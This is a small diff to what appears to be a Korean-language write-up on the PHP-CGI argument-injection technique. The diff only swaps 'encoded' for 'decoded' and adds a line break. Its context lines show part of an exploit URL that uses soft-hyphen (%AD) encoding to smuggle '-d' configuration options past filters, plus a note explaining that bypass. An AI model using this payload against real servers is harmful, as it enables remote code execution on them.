@@ -238,7 +238,8 @@ https://www.e.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redir
 
 > %ADd 와 같은 soft‑hyphen 인코딩은 일부 필터나 방화벽이 하이픈(-d)을 필터링/차단할 때 우회하는 기법
 
-인코딩하면 아래와 같습니다.  
+<br>
+디코딩하면 아래와 같습니다.  
 
 ```
 https://www.we.net/php-cgi/php-cgi.exe?
